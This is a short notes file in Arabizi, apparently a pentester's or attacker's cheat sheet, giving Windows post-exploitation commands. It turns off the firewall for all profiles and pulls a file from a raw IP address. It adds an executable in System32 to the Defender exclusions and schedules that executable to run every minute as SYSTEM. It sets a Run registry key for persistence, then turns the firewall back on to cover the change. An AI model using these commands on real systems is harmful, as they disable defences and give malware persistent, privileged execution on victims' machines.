~/Sam/opt

**1- 6y7 defe/fire
**

netsh advfirewall set allprofiles state off
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False


**2- 7ml almlf wa 76h bmkan kywais :
**

http://31.166.215.197:45000

**3- Excelude almlf >> mn al defend :
**


powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\Window\System32\easycofe.exe"


**4- Schedule a new task
**

schtasks /create /sc minute /mo 1 /tn Tinasoft /tr -c C:\Windows\System32\easycofe.exe /ru SYSTEM

**5- 76 regi in case :
**

reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Pentestlab /t REG_SZ /d "C:\tmp\pentestlab.exe"


**5- sh3'l al def/fire :
**


netsh advfirewall set allprofiles state on
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
